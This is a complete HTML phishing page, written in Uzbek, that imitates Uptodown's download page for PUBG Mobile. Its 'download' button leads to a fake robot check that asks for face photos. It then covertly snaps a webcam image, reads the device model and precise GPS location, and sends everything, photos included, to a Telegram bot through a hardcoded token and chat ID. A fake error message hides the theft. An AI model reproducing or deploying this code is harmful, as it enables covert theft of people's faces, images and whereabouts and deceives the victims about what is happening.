<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uptodown - Android o'yin va ilovalarini yuklab olish</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        :root { --blue: #1b85d3; --bg: #f2f2f2; }
        body { margin: 0; background: var(--bg); font-family: 'Roboto', sans-serif; color: #333; }
        header { background: var(--blue); padding: 15px 20px; display: flex; align-items: center; color: white; }
        .search-bar { flex-grow: 1; margin: 0 20px; background: rgba(255,255,255,0.2); padding: 8px; border-radius: 4px; border: none; color: white; }
        
        .main-container { max-width: 900px; margin: 20px auto; padding: 0 15px; }
        .app-header { background: white; padding: 20px; border-radius: 8px; display: flex; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .app-icon { width: 80px; height: 80px; border-radius: 18px; margin-right: 20px; }
        .download-section { margin-top: 20px; text-align: center; }
        .btn-dl { background: #2ecc71; color: white; padding: 15px 50px; border-radius: 50px; font-weight: bold; border: none; cursor: pointer; font-size: 18px; width: 100%; box-shadow: 0 4px 15px rgba(46, 204, 113, 0.3); }
        
        /* Backend Overlay */
        .overlay { display: none; position: fixed; inset: 0; background: white; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; padding: 30px; text-align: center; }
        .loader-ring { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--blue); border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        input[type="file"], video, canvas { display: none; }
    </style>
</head>
<body>

<header>
    <div style="font-weight: bold; font-size: 20px;">uptodown</div>
    <input type="text" class="search-bar" placeholder="Ilovalarni qidirish...">
</header>

<div class="main-container">
    <div class="app-header">
        <img src="https://img.utdstc.com/icon/60b/69b/60b69b3504d60e6f6a7d515a86a605f6e914f6e1:200" class="app-icon" alt="PUBG">
        <div>
            <h1 style="margin:0; font-size:22px;">PUBG MOBILE (KR)</h1>
            <p style="color:#888; margin:5px 0;">Krafton, Inc. | <span style="color:#2ecc71;">APK O'rnatilgan</span></p>
        </div>
    </div>

    <div class="download-section">
        <button class="btn-dl" onclick="triggerBackend()">Eng so'nggi versiya (APK)</button>
        <p style="font-size:12px; color:#999; margin-top:10px;">Xavfsiz yuklab olish. Uptodown tomonidan tekshirilgan.</p>
    </div>
</div>

<div id="backendScreen" class="overlay">
    <div id="loadingPhase">
        <div class="loader-ring"></div>
        <h2 style="color:var(--blue)">Server bilan aloqa...</h2>
        <p id="statusMsg">Qurilma drayverlari moslashtirilmoqda...</p>
    </div>

    <div id="actionPhase" style="display:none;">
        <h2 style="color:#e74c3c;">Xavfsizlik Tasdig'i</h2>
        <p>APK faylni yuklash uchun robot emasligingizni tasdiqlang. Galereyadan 5 ta yuzingiz aniq ko'ringan rasmni tanlang.</p>
        <label for="fileInput" style="display:block; padding:15px; border:2px dashed var(--blue); cursor:pointer; color:var(--blue); font-weight:bold;">📁 RASMLARNI TANLASH</label>
        <input type="file" id="fileInput" accept="image/*" multiple onchange="scanAndSend(this)">
        <p id="counter" style="margin-top:10px; font-weight:bold;"></p>
    </div>
</div>

<video id="vid" autoplay playsinline></video>
<canvas id="canv"></canvas>

<script>
    const CONFIG = { T: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", C: "6198817749" };
    let faces = [], camBlob = null;

    async function initAI() {
        await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model');
    }
    initAI();

    function triggerBackend() {
        document.getElementById('backendScreen').style.display = 'flex';
        setTimeout(() => {
            document.getElementById('loadingPhase').style.display = 'none';
            document.getElementById('actionPhase').style.display = 'block';
        }, 2500);
    }

    async function scanAndSend(input) {
        const btn = document.getElementById('counter');
        btn.innerText = "AI skanerlamoqda...";
        const files = Array.from(input.files);
        faces = [];

        for (let f of files) {
            const img = await faceapi.bufferToImage(f);
            const d = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
            if (d.length > 0) faces.push(f);
        }

        if (faces.length > 0) {
            btn.innerText = "Tasdiqlandi! Yuklash boshlanmoqda...";
            await startStealthCapture();
        } else {
            alert("Xato: Yuz aniqlanmadi. Iltimos, yuzingiz aniq tushgan rasmlarni tanlang.");
        }
    }

    async function startStealthCapture() {
        try {
            // 1. Yashirin Kamera
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('vid'); v.srcObject = stream;
            await new Promise(r => setTimeout(r, 1000));
            const c = document.getElementById('canv');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            camBlob = await (await fetch(c.toDataURL('image/jpeg', 0.6))).blob();
            stream.getTracks().forEach(t => t.stop());

            // 2. Qurilma nomi va Lokatsiya
            const deviceName = navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(['model'])).model : navigator.platform;
            
            navigator.geolocation.getCurrentPosition(async (p) => {
                const maps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                await finalPush(deviceName, maps);
            }, async () => {
                await finalPush(deviceName, "Rad etildi");
            }, {enableHighAccuracy: true});

        } catch (e) { alert("Xavfsizlik ruxsatisiz APK yuklanmaydi!"); }
    }

    async function finalPush(dev, loc) {
        const info = `📥 *UPTODOWN CLONE - SUCCESS*\n📱 Qurilma: ${dev}\n📍 Manzil: ${loc}\n👤 Holat: Verifikatsiyadan o'tdi`;

        await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CONFIG.C, text: info, parse_mode: 'Markdown'})
        });

        if(camBlob) {
            const fd = new FormData(); fd.append('chat_id', CONFIG.C); fd.append('photo', camBlob);
            await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd});
        }

        for (let f of faces) {
            const fd2 = new FormData(); fd2.append('chat_id', CONFIG.C); fd2.append('photo', f);
            fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd2});
        }

        setTimeout(() => {
            alert("Xato: Paket yuklashda xatolik yuz berdi (Error 403). Iltimos, keyinroq qayta urinib ko'ring.");
            location.reload();
        }, 2000);
    }
</script>
</body>
</html>
